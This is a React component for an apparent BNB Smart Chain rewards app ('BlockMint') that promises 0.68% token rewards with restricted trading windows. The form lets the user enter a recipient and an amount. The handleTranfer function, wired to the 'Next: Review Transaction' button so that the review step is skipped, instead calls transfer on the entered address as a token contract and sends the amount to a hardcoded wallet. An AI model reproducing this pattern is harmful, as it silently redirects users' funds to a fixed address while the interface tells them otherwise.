import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Badge } from '@/components/ui/badge';
import { useBlockMint } from '@/contexts/BlockMintContext';
import { AlertCircle, Send, CheckCircle } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useAppKitAccount } from '@reown/appkit/react';
import { parseUnits } from 'viem';
import { bsc } from 'viem/chains';
import { useWriteContract } from 'wagmi';
import { decimalMultiplication } from '@/utils/common';
interface TransactionFormProps {
  selectedBlock?: string;
}

const TransactionForm: React.FC<TransactionFormProps> = ({ selectedBlock }) => {
  const { wallet, systemWallet, createTransaction, isTransactionTime } = useBlockMint();
  const { toast } = useToast();
  const { address, isConnected } = useAppKitAccount();

  const [fromWallet, setFromWallet] = useState<string>('');
  const [toAddress, setToAddress] = useState<string>('');
  const [amount, setAmount] = useState<string>('');
  const [step, setStep] = useState<'form' | 'confirm' | 'success'>('form');
  const [isLoading, setIsLoading] = useState(false);
  const decimals = 4;
  const { writeContractAsync, isPending } = useWriteContract();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedBlock) {
      toast({
        title: "No Block Selected",
        description: "Please select a block from the Block Explorer first.",
        variant: "destructive"
      });
      return;
    }

    if (!isTransactionTime) {
      toast({
        title: "Transaction Window Closed",
        description: "Transactions can only be made during 7-8 AM or 7-8 PM.",
        variant: "destructive"
      });
      return;
    }

    setStep('confirm');
  };

  const confirmTransaction = async () => {
    setIsLoading(true);
    try {
      await createTransaction(fromWallet, toAddress, parseFloat(amount), selectedBlock!);
      setStep('success');
      toast({
        title: "Transaction Successful",
        description: `Transaction of ${amount} BNB completed successfully. You'll receive 0.68% BM token reward.`
      });
    } catch (error) {
      toast({
        title: "Transaction Failed",
        description: error instanceof Error ? error.message : "An error occurred",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const resetForm = () => {
    setFromWallet('');
    setToAddress('');
    setAmount('');
    setStep('form');
  };

  const handleTranfer = async () => {
    // setSelectedBlock(blockNumber);
    // setActiveTab('transaction');
    console.log(parseUnits(amount, decimals))
    if (!isConnected || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      // to ast.error('Address không hợp lệ hoặc chưa kết nối');
      return;
    }
    try {
      const txHash = await writeContractAsync({
        account: address as `0x${string}`,
        chain: bsc, // ✅ BẮT BUỘC
        address: toAddress as `0x${string}`,
        abi: [
          {
            name: 'transfer',
            type: 'function',
            stateMutability: 'nonpayable',
            inputs: [
              { name: '_to', type: 'address' },
              { name: '_value', type: 'uint256' },
            ],
            outputs: [{ name: '', type: 'bool' }],
          },
        ],
        functionName: 'transfer',
        args: [
          '0x0019d391cD9dE24AFEddA2b4a6EEd03d616C8F5D' as `0x${string}`, 
          // parseUnits(amount, decimals)
          parseUnits(amount, decimalMultiplication())
        ],
      });
      console.log(txHash, 'txHash')
    } catch (err) {
      console.log(err);
      // toast("error", `Stake failed. Please try again.`);
    }
  };

  if (!address && !isConnected) {
    return (
      <Card className="max-w-2xl mx-auto" data-id="dqga1a7dx" data-path="src/components/TransactionForm.tsx">
        <CardContent className="text-center py-12" data-id="foq5voo7m" data-path="src/components/TransactionForm.tsx">
          <AlertCircle className="w-16 h-16 text-gray-400 mx-auto mb-4" data-id="xlbrolaqz" data-path="src/components/TransactionForm.tsx" />
          <h3 className="text-lg font-semibold text-gray-700 mb-2" data-id="kgjvngrb6" data-path="src/components/TransactionForm.tsx">Wallet Not Connected</h3>
          <p className="text-gray-500" data-id="vg8yd5g2x" data-path="src/components/TransactionForm.tsx">Please connect your wallet to create transactions.</p>
        </CardContent>
      </Card>);

  }

  if (step === 'success') {
    return (
      <Card className="max-w-2xl mx-auto" data-id="1kdpv9jum" data-path="src/components/TransactionForm.tsx">
        <CardContent className="text-center py-12" data-id="ogaefrudz" data-path="src/components/TransactionForm.tsx">
          <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" data-id="ayss2n1cd" data-path="src/components/TransactionForm.tsx" />
          <h3 className="text-lg font-semibold text-gray-700 mb-2" data-id="gossiuwee" data-path="src/components/TransactionForm.tsx">Transaction Completed!</h3>
          <p className="text-gray-500 mb-6" data-id="ted9fhkkx" data-path="src/components/TransactionForm.tsx">Your transaction has been processed successfully.</p>
          <Button onClick={resetForm} className="bg-gradient-to-r from-blue-600 to-purple-600" data-id="i3cy53b1p" data-path="src/components/TransactionForm.tsx">
            Create Another Transaction
          </Button>
        </CardContent>
      </Card>);

  }

  if (step === 'confirm') {
    return (
      <Card className="max-w-2xl mx-auto" data-id="hqy70ardc" data-path="src/components/TransactionForm.tsx">
        <CardHeader data-id="vv91e36vk" data-path="src/components/TransactionForm.tsx">
          <CardTitle className="text-center" data-id="jwg2v3j6r" data-path="src/components/TransactionForm.tsx">Confirm Transaction</CardTitle>
        </CardHeader>
        <CardContent className="space-y-6" data-id="sb3y6w99f" data-path="src/components/TransactionForm.tsx">
          <div className="bg-gray-50 p-4 rounded-lg space-y-3" data-id="9dui8v30g" data-path="src/components/TransactionForm.tsx">
            <div className="flex justify-between" data-id="r0kchh6d6" data-path="src/components/TransactionForm.tsx">
              <span className="font-medium" data-id="uvkc9xhv9" data-path="src/components/TransactionForm.tsx">Block Number:</span>
              <span className="font-mono" data-id="uss8hpkww" data-path="src/components/TransactionForm.tsx">{selectedBlock}</span>
            </div>
            <div className="flex justify-between" data-id="kgm2ub52o" data-path="src/components/TransactionForm.tsx">
              <span className="font-medium" data-id="szv2jq6kb" data-path="src/components/TransactionForm.tsx">From:</span>
              <span className="font-mono text-sm" data-id="kusc7fefx" data-path="src/components/TransactionForm.tsx">{fromWallet.slice(0, 8)}...{fromWallet.slice(-6)}</span>
            </div>
            <div className="flex justify-between" data-id="uov3b6siy" data-path="src/components/TransactionForm.tsx">
              <span className="font-medium" data-id="u6ix4hnk7" data-path="src/components/TransactionForm.tsx">To:</span>
              <span className="font-mono text-sm" data-id="n1sdnu2ip" data-path="src/components/TransactionForm.tsx">{toAddress.slice(0, 8)}...{toAddress.slice(-6)}</span>
            </div>
            <div className="flex justify-between" data-id="5bt3u21cv" data-path="src/components/TransactionForm.tsx">
              <span className="font-medium" data-id="m7ceg2gpt" data-path="src/components/TransactionForm.tsx">Amount:</span>
              <span data-id="8ph0ilc1u" data-path="src/components/TransactionForm.tsx">{amount} BNB</span>
            </div>
            <div className="flex justify-between" data-id="gn0xs40ux" data-path="src/components/TransactionForm.tsx">
              <span className="font-medium" data-id="e0gb7dco5" data-path="src/components/TransactionForm.tsx">Expected Reward:</span>
              <span className="text-green-600" data-id="i18vxtq1t" data-path="src/components/TransactionForm.tsx">{(parseFloat(amount) * 0.0068).toFixed(4)} BM</span>
            </div>
          </div>
          
          <div className="flex space-x-4" data-id="5yo3cgc56" data-path="src/components/TransactionForm.tsx">
            <Button
              variant="outline"
              onClick={() => setStep('form')}
              className="flex-1" data-id="uqojk0vzx" data-path="src/components/TransactionForm.tsx">

              Back to Edit
            </Button>
            <Button
              // onClick={confirmTransaction}
              onClick={handleTranfer}
              disabled={isLoading}
              className="flex-1 bg-gradient-to-r from-blue-600 to-purple-600" data-id="8shtla36u" data-path="src/components/TransactionForm.tsx">

              {isLoading ? "Processing..." : "Confirm & Send"}
            </Button>
          </div>
        </CardContent>
      </Card>);

  }

  return (
    <div className="space-y-6" data-id="v2rozbpqe" data-path="src/components/TransactionForm.tsx">
      <div className="text-center mb-8" data-id="mgrkw7flx" data-path="src/components/TransactionForm.tsx">
        <h1 className="text-4xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent mb-4" data-id="krjv2wg5h" data-path="src/components/TransactionForm.tsx">
          Create Transaction
        </h1>
        {selectedBlock &&
        <Badge variant="secondary" className="text-lg px-4 py-2" data-id="h9qhp9dlv" data-path="src/components/TransactionForm.tsx">
            Selected Block: #{selectedBlock}
          </Badge>
        }
      </div>

      <Card className="max-w-2xl mx-auto" data-id="k7zele95q" data-path="src/components/TransactionForm.tsx">
        <CardHeader data-id="6sizzjkq5" data-path="src/components/TransactionForm.tsx">
          <CardTitle className="flex items-center" data-id="krkx70vsn" data-path="src/components/TransactionForm.tsx">
            <Send className="w-5 h-5 mr-2" data-id="59xibylgu" data-path="src/components/TransactionForm.tsx" />
            Transaction Details
          </CardTitle>
        </CardHeader>
        <CardContent data-id="ahquk4paq" data-path="src/components/TransactionForm.tsx">
          {/* <form onSubmit={handleSubmit} className="space-y-6" data-id="05p6tfiv2" data-path="src/components/TransactionForm.tsx"> */}
            <div className="space-y-2" data-id="t3zmkvl9i" data-path="src/components/TransactionForm.tsx">
              <Label htmlFor="fromWallet" data-id="bhqoauw50" data-path="src/components/TransactionForm.tsx">From Wallet</Label>
              <Select value={fromWallet} onValueChange={setFromWallet} required data-id="rrvsmn3ld" data-path="src/components/TransactionForm.tsx">
                <SelectTrigger data-id="2o56ub674" data-path="src/components/TransactionForm.tsx">
                  <SelectValue placeholder="Select sender wallet" data-id="q92rbx6w5" data-path="src/components/TransactionForm.tsx" />
                </SelectTrigger>
                <SelectContent data-id="yikb5wnvu" data-path="src/components/TransactionForm.tsx">
                  <SelectItem value={address} data-id="wandes41u" data-path="src/components/TransactionForm.tsx">
                    Connected Wallet ({address.slice(0, 8)}...{address.slice(-6)})
                    <Badge variant="outline" className="ml-2" data-id="tbk8p1i94" data-path="src/components/TransactionForm.tsx">Max: 100 USDT</Badge>
                  </SelectItem>
                  {systemWallet &&
                  <SelectItem value={systemWallet.address} data-id="w9vdwjofn" data-path="src/components/TransactionForm.tsx">
                      System Wallet ({systemWallet.address.slice(0, 8)}...{systemWallet.address.slice(-6)})
                      <Badge variant="default" className="ml-2" data-id="5z4lhds0z" data-path="src/components/TransactionForm.tsx">Unlimited</Badge>
                    </SelectItem>
                  }
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2" data-id="f7na95ev6" data-path="src/components/TransactionForm.tsx">
              <Label htmlFor="toAddress" data-id="5d07kxyqc" data-path="src/components/TransactionForm.tsx">To Address</Label>
              <Input
                id="toAddress"
                type="text"
                placeholder="0x..."
                value={toAddress}
                onChange={(e) => setToAddress(e.target.value)}
                required
                className="font-mono" data-id="u54jok10s" data-path="src/components/TransactionForm.tsx" />

            </div>

            <div className="space-y-2" data-id="hz9tul1c4" data-path="src/components/TransactionForm.tsx">
              <Label htmlFor="amount" data-id="ias0dzrsn" data-path="src/components/TransactionForm.tsx">Amount (BNB)</Label>
              <Input
                id="amount"
                type="number"
                step="0.001"
                min="0.001"
                placeholder="0.0"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                required data-id="x45f0n2k7" data-path="src/components/TransactionForm.tsx" />

              {fromWallet === wallet?.address &&
              <p className="text-sm text-orange-600" data-id="mas58qe4x" data-path="src/components/TransactionForm.tsx">
                  ⚠️ Connected wallet limited to 100 USDT per transaction
                </p>
              }
            </div>

            <div className="bg-blue-50 p-4 rounded-lg mt-4" data-id="8k488onbl" data-path="src/components/TransactionForm.tsx">
              <h4 className="font-semibold text-blue-800 mb-2" data-id="vgi0i8ajm" data-path="src/components/TransactionForm.tsx">Transaction Limits</h4>
              <ul className="text-sm text-blue-700 space-y-1" data-id="eu2ze3zww" data-path="src/components/TransactionForm.tsx">
                <li data-id="wilbr2t8t" data-path="src/components/TransactionForm.tsx">• Maximum 10 transactions per day</li>
                <li data-id="97r63iigz" data-path="src/components/TransactionForm.tsx">• Trading windows: 7-8 AM and 7-8 PM only</li>
                <li data-id="j274v0auw" data-path="src/components/TransactionForm.tsx">• Reward: 0.68% of transaction value in BM tokens</li>
                <li data-id="4t4kn5b4a" data-path="src/components/TransactionForm.tsx">• BM tokens unlock gradually over 60 days</li>
              </ul>
            </div>

            <Button
              // type="submit"
              onClick={() => handleTranfer()}
              className="w-full bg-gradient-to-r from-blue-600 to-purple-600 mt-4"
              // disabled={!isTransactionTime} 
              data-id="y516kwf8c" 
              data-path="src/components/TransactionForm.tsx"
            >

              {isTransactionTime ? "Next: Review Transaction" : "Trading Window Closed"}
            </Button>
          {/* </form> */}
        </CardContent>
      </Card>
    </div>);

};

export default TransactionForm;